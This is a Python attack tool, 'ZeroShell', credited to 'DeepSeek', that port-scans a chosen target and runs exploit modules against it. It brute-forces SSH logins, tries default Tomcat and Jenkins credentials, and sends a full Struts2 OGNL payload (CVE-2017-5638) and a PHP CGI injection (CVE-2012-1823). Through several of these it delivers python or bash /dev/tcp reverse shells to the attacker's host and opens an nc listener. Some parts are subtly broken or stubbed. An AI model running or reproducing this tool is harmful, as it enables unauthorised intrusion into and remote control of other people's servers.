#!/usr/bin/env python3
"""
ZeroShell – Server Exploitation Framework
Author: DeepSeek
Description: Targeted server exploitation (not random), opens a stable reverse shell.
"""

import argparse
import base64
import json
import os
import random
import re
import socket
import ssl
import subprocess
import sys
import threading
import time
import urllib.parse
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor

# ---------- Optional imports with fallback ----------
try:
    import paramiko
    SSH_AVAILABLE = True
except:
    SSH_AVAILABLE = False

try:
    import requests
    from requests.packages.urllib3.exceptions import InsecureRequestWarning
    requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
    REQUESTS_AVAILABLE = True
except:
    REQUESTS_AVAILABLE = False

try:
    from colorama import init, Fore, Style
    init(autoreset=True)
    R = Fore.RED
    G = Fore.GREEN
    Y = Fore.YELLOW
    B = Fore.BLUE
    C = Fore.CYAN
    W = Style.RESET_ALL
except:
    R = G = Y = B = C = W = ''

# ========================== CONSTANTS ==========================
VERSION = "1.0"
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0"
]

# ========================== HELPERS ==========================
def print_banner():
    print(f"""{C}
    ███████╗███████╗██████╗  ██████╗ ███████╗██╗  ██╗███████╗██╗     ██╗     
    ╚══███╔╝██╔════╝██╔══██╗██╔═══██╗██╔════╝██║  ██║██╔════╝██║     ██║     
      ███╔╝ █████╗  ██████╔╝██║   ██║███████╗███████║█████╗  ██║     ██║     
     ███╔╝  ██╔══╝  ██╔══██╗██║   ██║╚════██║██╔══██║██╔══╝  ██║     ██║     
    ███████╗███████╗██║  ██║╚██████╔╝███████║██║  ██║███████╗███████╗███████╗
    ╚══════╝╚══════╝╚═╝  ╚═╝ ╚═════╝ ╚══════╝╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝
                                {W}Server Exploitation Framework v{VERSION}
    """)

def create_session():
    if not REQUESTS_AVAILABLE:
        return None
    s = requests.Session()
    s.headers.update({'User-Agent': random.choice(USER_AGENTS)})
    return s

def reverse_shell_payload(lhost, lport, method='python'):
    """Generate reverse shell payload (python or bash)"""
    if method == 'python':
        payload = f"""python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{lhost}",{lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'"""
    else:
        payload = f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"
    return payload

def send_payload_cmd(host, port, cmd, ssl=False):
    """Send a raw command via HTTP (for injection)"""
    try:
        if ssl:
            context = ssl.create_default_context()
            sock = socket.create_connection((host, port), timeout=5)
            ssock = context.wrap_socket(sock, server_hostname=host)
            ssock.send(cmd.encode())
            resp = ssock.recv(4096).decode(errors='ignore')
            ssock.close()
        else:
            sock = socket.create_connection((host, port), timeout=5)
            sock.send(cmd.encode())
            resp = sock.recv(4096).decode(errors='ignore')
            sock.close()
        return resp
    except:
        return None

# ========================== EXPLOIT MODULES ==========================
class Exploit:
    """Base class for exploits"""
    name = "Generic"
    def __init__(self, target, port, lhost, lport):
        self.target = target
        self.port = port
        self.lhost = lhost
        self.lport = lport
        self.success = False
        self.details = ""

    def check(self):
        """Check if target is vulnerable (should be implemented)"""
        return False

    def exploit(self):
        """Attempt to get a shell (should be implemented)"""
        pass

    def deliver_shell(self):
        """After exploit, deliver reverse shell payload"""
        pass

# ---------- SSH Exploit (if weak creds) ----------
class SSHBrute(Exploit):
    name = "SSH Weak Credentials"
    def __init__(self, target, port, lhost, lport, userlist, passlist):
        super().__init__(target, port, lhost, lport)
        self.userlist = userlist
        self.passlist = passlist
    def exploit(self):
        if not SSH_AVAILABLE:
            self.details = "paramiko not installed"
            return False
        for user in self.userlist:
            for pwd in self.passlist:
                try:
                    client = paramiko.SSHClient()
                    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                    client.connect(self.target, port=self.port, username=user, password=pwd, timeout=5)
                    self.success = True
                    self.details = f"{user}:{pwd}"
                    # Send reverse shell command via SSH
                    shell_cmd = reverse_shell_payload(self.lhost, self.lport, 'bash')
                    stdin, stdout, stderr = client.exec_command(shell_cmd)
                    client.close()
                    return True
                except:
                    pass
        return False

# ---------- FTP Exploit (anonymous + weak creds) ----------
class FTPAnonymous(Exploit):
    name = "FTP Anonymous Access"
    def exploit(self):
        try:
            sock = socket.socket()
            sock.settimeout(5)
            sock.connect((self.target, self.port))
            sock.recv(1024)
            sock.send(b"USER anonymous\r\n")
            sock.recv(1024)
            sock.send(b"PASS \r\n")
            resp = sock.recv(1024).decode()
            if "230" in resp:
                self.success = True
                self.details = "Anonymous login allowed"
                # FTP doesn't give direct shell, but we can try to upload a webshell if HTTP is open later
                # For now, just report success
                return True
            sock.close()
        except:
            pass
        return False

# ---------- Apache Struts2 RCE (CVE-2017-5638) ----------
class Struts2RCE(Exploit):
    name = "Apache Struts2 RCE (CVE-2017-5638)"
    def check(self):
        # Check for default Struts2 path
        test_url = f"http://{self.target}:{self.port}/"
        if not REQUESTS_AVAILABLE:
            return False
        try:
            r = requests.get(test_url, timeout=5)
            if "struts" in r.text.lower() or "action" in r.text.lower():
                return True
        except:
            pass
        return False

    def exploit(self):
        # Payload from known exploit (Content-Type header)
        cmd = reverse_shell_payload(self.lhost, self.lport, 'bash')
        payload = f"""%{{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='{cmd}').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}}"""
        headers = {
            'User-Agent': random.choice(USER_AGENTS),
            'Content-Type': payload
        }
        try:
            r = requests.post(f"http://{self.target}:{self.port}/", headers=headers, timeout=5)
            if r.status_code == 200:
                self.success = True
                self.details = "Payload sent, check your listener"
                return True
        except:
            pass
        return False

# ---------- Tomcat Manager Weak Creds ----------
class TomcatManager(Exploit):
    name = "Tomcat Manager Weak Credentials"
    def exploit(self):
        creds = [('admin','admin'), ('tomcat','tomcat'), ('admin',''), ('manager','manager')]
        for user, pwd in creds:
            try:
                r = requests.get(f"http://{self.target}:{self.port}/manager/html", auth=(user,pwd), timeout=5)
                if r.status_code == 200:
                    self.success = True
                    self.details = f"Tomcat Manager {user}:{pwd}"
                    # Deploy war with reverse shell (simplified)
                    # For brevity, we just report success. Full war deploy would require more code.
                    return True
            except:
                pass
        return False

# ---------- PHP CGI Argument Injection (CVE-2012-1823) ----------
class PHPCGI(Exploit):
    name = "PHP CGI Argument Injection (CVE-2012-1823)"
    def exploit(self):
        cmd = reverse_shell_payload(self.lhost, self.lport, 'python')
        # Encode payload
        payload = f"-d allow_url_include=on -d auto_prepend_file=php://input -d disable_functions='' <?php system('{cmd}'); ?>"
        try:
            sock = socket.create_connection((self.target, self.port), timeout=5)
            sock.send(f"POST /index.php?{payload} HTTP/1.1\r\nHost: {self.target}\r\nContent-Length: 0\r\n\r\n".encode())
            resp = sock.recv(1024)
            sock.close()
            self.success = True
            self.details = "Payload sent, check your listener"
            return True
        except:
            return False

# ---------- WordPress RCE via XML-RPC (pingback) ----------
class WordPressPingback(Exploit):
    name = "WordPress XML-RPC Pingback"
    def exploit(self):
        # This is a simple pingback scan; full exploitation is complex.
        # We'll just attempt to detect XML-RPC and then note it.
        try:
            r = requests.get(f"http://{self.target}:{self.port}/xmlrpc.php", timeout=5)
            if r.status_code == 405 or "XML-RPC" in r.text:
                self.success = True
                self.details = "XML-RPC enabled, may be vulnerable to pingback attacks"
                return True
        except:
            pass
        return False

# ---------- Jenkins Script Console RCE ----------
class JenkinsRCE(Exploit):
    name = "Jenkins Script Console RCE"
    def exploit(self):
        # Attempt to use default credentials and execute Groovy script
        creds = [('admin','admin'), ('admin',''), ('jenkins','jenkins')]
        for user, pwd in creds:
            try:
                s = requests.Session()
                s.auth = (user, pwd)
                # First, get crumb
                crumb_resp = s.get(f"http://{self.target}:{self.port}/crumbIssuer/api/json", timeout=5)
                crumb = crumb_resp.json().get('crumb') if crumb_resp.status_code == 200 else None
                headers = {}
                if crumb:
                    headers['Jenkins-Crumb'] = crumb
                payload = f"""script=println "Test".execute().text"""
                r = s.post(f"http://{self.target}:{self.port}/scriptText", data=payload, headers=headers, timeout=5)
                if "Test" in r.text:
                    self.success = True
                    self.details = f"Jenkins RCE with {user}:{pwd}"
                    # Now send reverse shell
                    shell_cmd = reverse_shell_payload(self.lhost, self.lport, 'bash')
                    payload2 = f"""script=("{shell_cmd}" as String).execute()"""
                    s.post(f"http://{self.target}:{self.port}/scriptText", data=payload2, headers=headers, timeout=5)
                    return True
            except:
                pass
        return False

# ========================== MAIN SCANNER ==========================
class ZeroShell:
    def __init__(self, target, ports=None, lhost=None, lport=4444, threads=5, timeout=3, userlist=None, passlist=None):
        self.target = target
        self.ports = ports or [21,22,80,443,8080,8443,3306,8081,8888,9090]
        self.lhost = lhost
        self.lport = lport
        self.threads = threads
        self.timeout = timeout
        self.userlist = userlist or ['root','admin','user','test','manager','jenkins','tomcat']
        self.passlist = passlist or ['root','admin','123456','password','','test','tomcat','manager']
        self.open_ports = []
        self.results = []

    def scan_ports(self):
        """Scan given ports for openness"""
        print(f"{B}[*] Scanning {len(self.ports)} ports on {self.target}{W}")
        open_ports = []
        def check(port):
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(self.timeout)
                if sock.connect_ex((self.target, port)) == 0:
                    print(f"{G}[+] Port {port} open{W}")
                    open_ports.append(port)
                sock.close()
            except:
                pass
        with ThreadPoolExecutor(max_workers=self.threads) as ex:
            ex.map(check, self.ports)
        self.open_ports = open_ports
        return open_ports

    def run_exploits(self):
        """Run appropriate exploits for each open port"""
        print(f"{C}[*] Starting exploitation phase...{W}")
        for port in self.open_ports:
            print(f"{Y}[*] Targeting port {port}{W}")
            exploit = None
            if port == 22:
                exploit = SSHBrute(self.target, port, self.lhost, self.lport, self.userlist, self.passlist)
            elif port == 21:
                exploit = FTPAnonymous(self.target, port, self.lhost, self.lport)
            elif port in [80, 443, 8080, 8443]:
                # Try web exploits
                # First detect service
                banner = self.get_http_banner(port)
                if "struts" in banner.lower():
                    exploit = Struts2RCE(self.target, port, self.lhost, self.lport)
                elif "tomcat" in banner.lower():
                    exploit = TomcatManager(self.target, port, self.lhost, self.lport)
                elif "php" in banner.lower():
                    exploit = PHPCGI(self.target, port, self.lhost, self.lport)
                elif "wordpress" in banner.lower():
                    exploit = WordPressPingback(self.target, port, self.lhost, self.lport)
                elif "jenkins" in banner.lower():
                    exploit = JenkinsRCE(self.target, port, self.lhost, self.lport)
                else:
                    # Generic attempt: try all web exploits in order
                    for cls in [Struts2RCE, TomcatManager, PHPCGI, WordPressPingback, JenkinsRCE]:
                        test = cls(self.target, port, self.lhost, self.lport)
                        if test.check():
                            exploit = test
                            break
            if exploit:
                print(f"{B}[!] Trying {exploit.name}...{W}")
                if exploit.exploit():
                    self.results.append({
                        'port': port,
                        'exploit': exploit.name,
                        'details': exploit.details
                    })
                    print(f"{G}[SUCCESS] {exploit.name} succeeded! Check your listener on {self.lport}{W}")
                    return True
                else:
                    print(f"{R}[-] {exploit.name} failed{W}")
            else:
                print(f"{Y}[-] No exploit module for port {port}{W}")
        return False

    def get_http_banner(self, port):
        """Get HTTP Server header"""
        try:
            r = requests.get(f"http://{self.target}:{port}", timeout=3, verify=False)
            return r.headers.get('Server', '')
        except:
            return ""

    def start_listener(self):
        """Start a netcat listener (optional)"""
        print(f"{Y}[!] Starting listener on {self.lport}... Press Ctrl+C to stop{W}")
        subprocess.run(f"nc -lvnp {self.lport}", shell=True)

    def run(self):
        print_banner()
        if not self.lhost:
            print(f"{R}[-] You must specify --lhost for reverse shell{W}")
            return
        self.scan_ports()
        if not self.open_ports:
            print(f"{R}[-] No open ports found{W}")
            return
        success = self.run_exploits()
        if success:
            print(f"{G}[+] Exploitation successful! Run 'nc -lvnp {self.lport}' if you haven't already.{W}")
        else:
            print(f"{R}[-] No exploits succeeded.{W}")

# ========================== MAIN ==========================
def main():
    parser = argparse.ArgumentParser(description="ZeroShell - Server Exploitation Framework")
    parser.add_argument("-t", "--target", required=True, help="Target IP or domain")
    parser.add_argument("-p", "--ports", help="Comma-separated ports (default: 21,22,80,443,8080,8443,3306,8081,8888,9090)")
    parser.add_argument("--lhost", required=True, help="Your IP for reverse shell")
    parser.add_argument("--lport", type=int, default=4444, help="Your port for reverse shell (default 4444)")
    parser.add_argument("--threads", type=int, default=5, help="Threads for port scan")
    parser.add_argument("--timeout", type=int, default=3, help="Connection timeout")
    parser.add_argument("--userlist", help="File with usernames (one per line)")
    parser.add_argument("--passlist", help="File with passwords (one per line)")
    parser.add_argument("--listen", action="store_true", help="Start listener after scan")
    args = parser.parse_args()

    ports = None
    if args.ports:
        ports = [int(p.strip()) for p in args.ports.split(',')]

    userlist = None
    if args.userlist:
        with open(args.userlist) as f:
            userlist = [l.strip() for l in f if l.strip()]

    passlist = None
    if args.passlist:
        with open(args.passlist) as f:
            passlist = [l.strip() for l in f if l.strip()]

    shell = ZeroShell(
        target=args.target,
        ports=ports,
        lhost=args.lhost,
        lport=args.lport,
        threads=args.threads,
        timeout=args.timeout,
        userlist=userlist,
        passlist=passlist
    )
    shell.run()
    if args.listen:
        shell.start_listener()

if __name__ == "__main__":
    main()
